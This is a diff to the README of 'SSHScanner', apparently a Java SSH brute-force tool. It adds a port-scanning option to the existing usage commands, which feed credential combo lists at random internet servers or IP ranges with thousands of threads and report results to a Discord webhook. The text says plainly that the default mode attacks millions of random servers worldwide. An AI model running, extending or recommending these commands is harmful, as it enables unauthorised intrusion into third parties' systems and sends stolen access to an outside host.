@@ -33,6 +33,7 @@ You can reuse SSHScanner but make sure you comply with the [LICENSE](https://git
 - **Scan random SSH servers :** java -jar SSHScanner.jar -combo combo.txt -threads 1 -port 22 -timeout 6000 -webhook "https://discord.com/api/webhooks/x/y" -verbose true
 - **Scan SSH range :** java -jar SSHScanner.jar -range range.txt -combo combo.txt -threads 3000 -port 22 -timeout 6000 -webhook "https://discord.com/api/webhooks/x/y" -verbose false
 - **Scan specific SSH server :** java -jar SSHScanner.jar -combo combo.txt -threads 1 -port 22 -timeout 6000 -webhook "https://discord.com/api/webhooks/x/y" -verbose true -host "127.0.0.1"
+- **Scan ports of specific SSH server (to get SSH port) :** java -jar SSHScanner.jar -combo combo.txt -timeout 1100 -webhook "https://discord.com/api/webhooks/x/y" -verbose true -host "127.0.0.1" -portlist ports.txt
 
 
 ## Arguments
@@ -47,4 +48,5 @@ Note: Each argument is optional
 * **-verbose <boolean>** | Whether or not to display failed attempts on the console (default: true)
 * **-host <IP address>** | **WARNING: Only for bruteforce specific host** | Use this parameter ONLY if you want to perform a bruteforce attack on a specific SSH server - if you use this parameter you only will attack the requested server and not millions of random servers around the world (default: "")
 * **-range <path>** | **WARNING: Only for bruteforce specifics ranges** | Use this parameter ONLY if you want to perform a bruteforce attack on specifics SSH servers (by putting ranges) - if you use this parameter you only will attack the requested ranges and not millions of random servers around the world (default: "")
+* **-portlist <path>** | **WARNING: Only to get SSH port** | Use this parameter ONLY if you want to perform a bruteforce port attack on specific SSH server - if you use this parameter you only will attack the requested server (default: "")
 
